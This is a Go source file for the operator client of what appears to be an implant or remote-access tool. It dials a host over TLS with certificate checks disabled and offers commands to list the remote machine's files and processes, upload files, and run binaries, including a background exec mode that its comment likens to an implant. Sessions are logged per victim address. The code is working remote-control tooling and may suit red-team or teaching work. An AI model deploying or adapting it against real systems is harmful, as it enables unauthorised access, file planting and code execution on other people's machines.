package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

var certPEM = []byte(`-----BEGIN CERTIFICATE-----
MIIFjzCCA3egAwIBAgIUFnwY1e3Y0xUWxfAC53vhhrE+UqcwDQYJKoZIhvcNAQEL
BQAwVzELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExEDAOBgNVBAcM
B09ha2xhbmQxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0y
NDExMDIxODAxMzVaFw0yNTExMDIxODAxMzVaMFcxCzAJBgNVBAYTAlVTMRMwEQYD
VQQIDApDYWxpZm9ybmlhMRAwDgYDVQQHDAdPYWtsYW5kMSEwHwYDVQQKDBhJbnRl
cm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIK
AoICAQClhnlFTlaiGEFCRDz6Y3XU7VqdGNepb5oZ9xnY2F5VgAPDGv8lRxV4nUBf
NaxlphC2djPuJNTrs707vd2s0QbL6VgqMQ3TiGJGN8FaSf13yVDjZXl52Tvxi4nz
j5UQ3jYodYTwnFCkKexiKnEgBp2vMCy8SgKgA/SLIA3JjNs9Zrh9CVfgePKE1xC3
lMEx2UrLoTmw54PhYInMsTwqie5/imdRteIeQz5mbY7OwHL73vA3LT0irWOtGE9K
EQakh1sVb2ae91+5fLo+1kUCrpJXcI3j+cvoOHY5UwZQn9uD2AmV4GWYMmM3wdye
3kAv/fQQFfCtOf3B58XryNEWhtdCbwCK8Mp9LpCnBpSBpQ/Xg0w4ZSwZDPRsjdLM
MSgbPRRX5hZiSK3U87vTwnl+Ofv4SAWmsYDEAukiNr6iMz2g0hLrPklhK+RiqV+r
JkTTlsuE6lgyVtDk1YbArFZA1Hb2lxfQuXc5nvc3RNWZrf0E3SW+TojJNveEVQru
Rt53S/8cPVosaOUBnvcBivMHV+Cg23mjEt8+SlhxrjGB5ETw/N5QKBFsb1qvPy+c
tM4yI1M6HgB6px7Fpo3w4D0nVCs3i9HqRmXEMYGBUOLNcbbcYfcr/dmOHO0LQ2Cr
QeM88v3TBuxdrfz1DW7V2NFZD9C09aNhHsKmyDyN/FWXQ1lleQIDAQABo1MwUTAd
BgNVHQ4EFgQUlzGaJHpFctMEW5LLlyABVgT+mWgwHwYDVR0jBBgwFoAUlzGaJHpF
ctMEW5LLlyABVgT+mWgwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
AgEAj8r/n9M/PerTYeLY/22AXwsQObNqtAMsd3AN9bueDQbPUgbXuQnfCVVMCdke
tce+QQY3lPjwGU3hYXC14FXNO5CCAeyayjv/7cswPUEwYwCv1l47wByrPbEx7itQ
YRbqmtPvPnZILJJyOceVjyVQw50CpFKsjxu1jQHcO02TWtr2a0URCxMVhhr9GXgz
MJeDVM+vRYoNtX52JBrWW4gtPx+occC7DPHoNxb+fxVcp5I2Sy9IzGXY8lCR/LoC
GNVT+HRHbrZ7I67YIYbXZ14h3Wkns4h3uhevQR1jwuGdgFC9iRZLmid5Y+0rO10V
4taBsong/py2QjVS1xg2Pu6N8iWAjXILrq6TSjYy7rEr3myeCm/Vc9AmUe95RTPy
NkVsqZWmP3nkZ+foamXYYi55nYs35anzjBctE2SiCy9lbkCiYUKahzyCn6IIoOE+
039fGW1h14sZHxyIWZWCjVhq78zHC0/yECdNKbNTdwM8KKMZnrYdyPxUXL0m036h
QI59vByfNQpCNQ5kjliUQ44Dru1qn+au+prISFKzXEVDNqZCZs4giFl833hbrqov
7O3SnnJsswW1ImIb/t3v5FZpC+EYZrz80tsrnQaq4GzVDvTgCZY/N/Pe+JWuX37t
XvVtRy0XVuNF96nHAgyq3IAvqqT6UhsK/oNfqeXAFzylptw=
-----END CERTIFICATE-----`)

// function will generate a linebreak of - 76 times and it will be the color yellow
//
// returns: outputColored string: the colored break
func genBreak() string {
	output := strings.Repeat("-", 76)
	outputColored := color.YellowString(output)
	return outputColored
}

func parseProcessList(conn net.Conn) {
	responseScanner := bufio.NewScanner(conn)
	remoteAddr := conn.RemoteAddr().String()

	var banner string
	banner = getFormattedTimeStamp() + "\n"
	banner += fmt.Sprintf("%s\n", genBreak())
	banner += fmt.Sprintf("%-8s %-8s %-60s\n", "PID", "PPID", "Name")
	banner += fmt.Sprintf("%s\n", genBreak())
	fmt.Println(banner)
	writeData(banner, remoteAddr)

	for responseScanner.Scan() {
		line := responseScanner.Text()
		if line == "__END__" || strings.Contains(line, "__END__") {
			fmt.Println("")
			writeData("\n", remoteAddr)
			return
		} else {
			fmt.Println(line)
			writeData(line+"\n", remoteAddr)
		}
	}
	if err := responseScanner.Err(); err != nil {
		fmt.Println("[!] Error reading server response:", err)
	}
}

func parseListDirectories(conn net.Conn, path string) {
	remoteAddr := conn.RemoteAddr().String()
	responseScanner := bufio.NewScanner(conn)

	var banner string
	banner = getFormattedTimeStamp() + "\n"
	banner += fmt.Sprintf("%s\n", genBreak())
	banner += fmt.Sprintf("[+] %s\n", path)
	banner += fmt.Sprintf("%-15s %-22v %-10s %-20s\n", "Permissions", "Modified Time", "Size", "Name")
	banner += fmt.Sprintf("%s\n", genBreak())

	fmt.Println(banner)
	writeData(banner, remoteAddr)

	// Read the response from the server
	for responseScanner.Scan() {
		line := responseScanner.Text()
		if line == "__END__" || strings.Contains(line, "__END__") {
			fmt.Println("")
			// drop back to the client prompt
			writeData("\n", remoteAddr)
			return
		} else {
			// Print each line of the server's response
			fmt.Println(line)
			writeData(line+"\n", remoteAddr)
		}
	}
	if err := responseScanner.Err(); err != nil {
		fmt.Println("[!] Error reading server response:", err)
	}
}

func listDirectories(conn net.Conn, path string) {
	// send the request to the server and wait for a reply
	fmt.Fprintf(conn, "%v\n", path)
	parseListDirectories(conn, path)
}

func parseUpload(conn net.Conn) {
	responseScanner := bufio.NewScanner(conn)
	for responseScanner.Scan() {
		line := responseScanner.Text()
		if line == "__END__" || strings.Contains(line, "__END__") {
			fmt.Println("")
			return
		} else {
			fmt.Println(line)
		}
	}
	if err := responseScanner.Err(); err != nil {
		fmt.Println("[!] Error reading server response:", err)
	}

}

func uploadFile(conn net.Conn, localPath string, remotePath string) {
	file, err := os.Open(localPath)
	if err != nil {
		fmt.Printf("[!] Failed to open file: %v\n", err)
		return
	}
	defer file.Close()

	// Get the file size
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Printf("[!] Failed to get file size: %v\n", err)
		return
	}
	fileSize := fileInfo.Size()

	// Send the remote path and file size to the server
	fmt.Fprintf(conn, "upload %v %v\n", remotePath, fileSize)

	// Wait for confirmation from the server before sending the file
	ackBuf := make([]byte, 1)
	_, err = conn.Read(ackBuf)
	if err != nil || ackBuf[0] != '1' {
		fmt.Println("[!] Did not receive acknowledgment from the server.")
		return
	}

	// Send the file contents over the connection
	bytes_sent, err := io.Copy(conn, file)
	if err != nil {
		fmt.Printf("[!] Failed to send file: %v\n", err)
		return
	}
	fmt.Printf("[+] Successfully sent %d bytes\n", bytes_sent)
	parseUpload(conn)

}

func parseExecBackground(conn net.Conn, binPath string, args string) {
	responseScanner := bufio.NewScanner(conn)
	remoteAddr := conn.RemoteAddr().String()

	var banner string
	banner = getFormattedTimeStamp() + "\n"
	banner += fmt.Sprintf("%s\n", genBreak())
	banner += fmt.Sprintf("[+] exec -b %s %s\n", binPath, args)
	banner += fmt.Sprintf("%s\n", genBreak())
	fmt.Println(banner)
	writeData(banner, remoteAddr)

	for responseScanner.Scan() {
		line := responseScanner.Text()
		if line == "__END__" || strings.Contains(line, "__END__") {
			fmt.Println("")
			// drop back to the client prompt
			writeData("\n", remoteAddr)
			return
		} else {
			// Print each line of the server's response
			fmt.Println(line)
			writeData(line+"\n", remoteAddr)
		}
	}
	if err := responseScanner.Err(); err != nil {
		fmt.Println("[!] Error reading server response:", err)
	}
}

func parseExecForeground(conn net.Conn, binPath string, args string) {
	responseScanner := bufio.NewScanner(conn)
	remoteAddr := conn.RemoteAddr().String()

	var banner string
	banner = getFormattedTimeStamp() + "\n"
	banner += fmt.Sprintf("%s\n", genBreak())
	banner += fmt.Sprintf("[+] exec %s %s\n", binPath, args)
	banner += fmt.Sprintf("%s\n", genBreak())

	fmt.Println(banner)
	writeData(banner, remoteAddr)

	for responseScanner.Scan() {
		line := responseScanner.Text()
		if line == "__END__" || strings.Contains(line, "__END__") {
			fmt.Println("")
			// drop back to the client prompt
			writeData("\n", remoteAddr)
			return
		} else {
			// Print each line of the server's response
			fmt.Println(line)
			writeData(line+"\n", remoteAddr)
		}
	}
	if err := responseScanner.Err(); err != nil {
		fmt.Println("[!] Error reading server response:", err)
	}

}

func execBinary(conn net.Conn, binPath string, args string, background bool) {
	if background {
		fmt.Fprintf(conn, "exec -b %s %s\n", binPath, args)
		parseExecBackground(conn, binPath, args)

	} else {
		fmt.Fprintf(conn, "exec %s %s\n", binPath, args)
		parseExecForeground(conn, binPath, args)
	}
}

func getFormattedTimeStamp() string {
	formattedTime := time.Now().Format("01-02-06 15:04:05")
	return formattedTime

}

func dirExists(path string) bool {
	info, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return info.IsDir()
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

func writeData(data string, remote_addr string) error {
	file, err := os.OpenFile("../output/"+remote_addr+"/combined_log.txt", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		return err
	}
	return nil
}

// control function for the command parsing, this is where we will validate that the provied
// input is valid, ensure the arguments line up properly and are valid before passing the action
// over to the specific function i.e. listDirectories
//
// args: conn: the connection to the client
// args: command []string: the user command broken up into an array
func commandParser(conn net.Conn, command []string) {
	action := command[0]      // the action we are taking i.e. ls
	actionLen := len(command) // the length of the entire array

	// should never have more than two arguments in our array command action ls and a path
	// if there are spaces in the path there should be quotes either single or double
	if action == "ls" && actionLen == 2 {
		builtCommand := fmt.Sprintf("ls %s", command[1])
		listDirectories(conn, builtCommand)
	} else if action == "ls" && actionLen == 3 {
		// this likely means the user has a space in the path w/o quotes
		fmt.Println("[!] ls: too many arguments, place path with spaces in ''")
		return
	} else if action == "ls" && actionLen == 1 {
		// lets assume pwd
		builtCommand := fmt.Sprintf("ls %s", ".")
		listDirectories(conn, builtCommand)
		return
	}

	if action == "ps" && actionLen == 1 {
		fmt.Fprintf(conn, "%v\n", action)
		parseProcessList(conn)
	} else if action == "ps" && actionLen > 1 {
		fmt.Println("[!] ps takes not arguments")
	}

	if action == "upload" && actionLen == 3 {
		localPath := command[1]
		remotePath := command[2]
		uploadFile(conn, localPath, remotePath)
	}

	// exec in the background like an implant dont need stdout
	if action == "exec" && command[1] == "-b" {
		// exec -b /path/binary "arg1 arg2 arg3"
		binPath := command[2]
		if len(command) == 3 {
			args := ""
			execBinary(conn, binPath, args, true)
		} else if len(command) > 3 {
			args := command[3]
			execBinary(conn, binPath, args, true)
		}

	} else if action == "exec" && command[1] != "-b" {
		binPath := command[1]
		if len(command) == 2 {
			args := ""
			execBinary(conn, binPath, args, false)
		} else if len(command) == 3 {
			args := command[2]
			execBinary(conn, binPath, args, false)
		}
	}

	if action == "help" && actionLen == 1 {
		helpCommands()
	} else if action == "help" && command[1] == "ps" {
		helpPS()
	} else if action == "help" && command[1] == "exec" {
		helpExec()
	} else if action == "help" && command[1] == "ls" {
		helpLS()
	} else if action == "help" && command[1] == "upload" {
		helpUpload()
	}
}

// function will take in the user input recieved from the main menu
// it will use regex and split out the provided command into an array seperated by spaces
// if part of the input is ” or "" it will be treated as one part. useful if a path contains
// spaces or for executing a binary and we want to pass multiple arguments to the binary
// the user can quote wrap all the arguments and then it will be easier to parse accurately
//
// args: input string the command to parse
// return: parts: []string the broken up string into its parts
// parts[0] is the command i.e. ls
// parts[1] is the path
func splitCommand(input string) []string {
	// Regular expression to match quoted substrings or standalone words
	re := regexp.MustCompile(`"([^"]+)"|'([^']+)'|(\S+)`)

	// Find all matches in the input string
	matches := re.FindAllStringSubmatch(input, -1)

	var parts []string
	for _, match := range matches {
		// Pick the first non-empty matched group (either quoted or unquoted)
		for _, part := range match[1:] {
			if part != "" {
				parts = append(parts, part)
				break
			}
		}
	}
	return parts
}

var rlConfig = &readline.Config{
	Prompt:          "GU >> ",
	HistoryFile:     "/tmp/readline.tmp",
	AutoComplete:    nil,
	InterruptPrompt: "^C",
	EOFPrompt:       "exit",
}

// main menu that will establish the client prompt and provide it to the user
// will take in user input before passing it to the command parser
//
// args: the connection to the client
func main_menu(conn net.Conn) {
	//fmt.Printf("Dialed: %v\n", conn.RemoteAddr().String())
	for {
		var err error
		rl, err := readline.NewEx(rlConfig)
		if err != nil {
			fmt.Printf("Error initializing readline: %s\n", err)
			return
		}
		defer rl.Close()

		raw_line, err := rl.Readline()
		if err != nil {
			break
		}

		// User hit the enter key with nothing on the line
		if raw_line == "" {
			continue
		}

		line := strings.TrimSpace(raw_line)
		commandParts := splitCommand(line)

		if line == "quit" {
			writeData(getFormattedTimeStamp()+ "\n" + "[!] Client Disconnected", conn.RemoteAddr().String())
			return
		} else {
			commandParser(conn, commandParts)
		}

	}
}

// main client function that will take in host and port arguments. connect to the remote host
// over tls wrapped tcp.
//
// args: host string
// args: port string
func main() {

	host := flag.String("host", "127.0.0.1", "The host to connect to")
	port := flag.String("port", "8080", "The port to connect to")

	flag.Parse()

	target := *host + ":" + *port

	// Create a certificate pool and add the embedded server certificate
	rootCAs := x509.NewCertPool()
	ok := rootCAs.AppendCertsFromPEM(certPEM)
	if !ok {
		fmt.Println("[!] Failed to append server certificate to store")
		return
	}

	// Create TLS configuration
	tlsConfig := &tls.Config{
		RootCAs:            rootCAs,
		InsecureSkipVerify: true,
	}

	conn, err := tls.Dial("tcp", target, tlsConfig)
	if err != nil {
		fmt.Println("[!] Error connecting to:", target)
		fmt.Println("[!] Error:", err)
		return
	}
	fmt.Println("client: connected to: ", conn.RemoteAddr())
	defer conn.Close()

	if !dirExists("../output") {
		err := os.Mkdir("../output", 0777)
		if err != nil {
			fmt.Printf("[!] Cannot make ../output, check file permissions\n")
		}
	}

	remoteAddr := conn.RemoteAddr().String()
	if !dirExists("../output/" + remoteAddr) {
		err := os.Mkdir("../output/"+remoteAddr, 0777)
		if err != nil {
			fmt.Printf("[!] Cannot make ../output/%s, check file permissions\n", remoteAddr)
		}
	}

	if !fileExists("../output/" + remoteAddr + "/combined_log.txt") {
		file, err := os.Create("../output/" + remoteAddr + "/combined_log.txt")
		if err != nil {
			fmt.Printf("[!] Cannot create ../output/%s/combined_log.txt, check file permissions\n", remoteAddr)
		}
		file.Close()
	}

	writeData(getFormattedTimeStamp()+" client: connected to: "+conn.RemoteAddr().String()+"\n", conn.RemoteAddr().String())
	banner()
	main_menu(conn)
}
